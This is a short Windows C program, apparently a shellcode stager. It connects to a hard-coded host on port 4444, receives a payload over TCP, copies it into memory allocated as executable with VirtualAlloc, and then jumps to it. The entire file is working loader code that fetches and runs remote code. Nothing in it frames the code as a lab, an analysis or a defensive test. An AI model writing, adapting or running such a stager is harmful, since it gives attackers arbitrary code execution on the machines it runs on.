#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#define IP_ADDRESS "10.230.229.13"
#define PORT 4444
#define BUF_LEN 1024
#define PAYLOAD_SZ 819200

int main() {
  // Create WSADATA Object
  WSADATA wsaData;
  int wResult;

  wResult = WSAStartup(MAKEWORD(2,2), &wsaData);
  if (wResult != 0) {
    return 1;
  };

  // Create a socket to connect to an IP and port
  printf("Creating socket...\n");
  SOCKET ConnectSocket = INVALID_SOCKET;
  ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  // Set Receive timeout on the socket
  struct timeval tv;
  tv.tv_sec = 1;
  setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));

  // Connect to socket
  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );

  // Receive data from port;
  char buf[BUF_LEN] = "";
  char data[PAYLOAD_SZ] = { 0 };
  int res = 0;
  int recvd = 0;

  printf("Receiving");
  do {
    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
    if (res > 0) {
      strcat(data, buf);
      printf(".");
      recvd += res;
    }
    else if (res == 0) {
      break;
    }
    else {
      break;
    }
  } while (res > 0);
  strcat(data, "\0");
  printf("Received payload with size of %d.\n", recvd);
  printf(data);
  printf("Allocating RWX memory.\n");
  // Allocate RWX memory for the data
  void* rwx = VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(rwx, data, recvd);

  printf("Executing payload.\n");
  // Execute the received payload
  (*(void(*)()) rwx)();
}

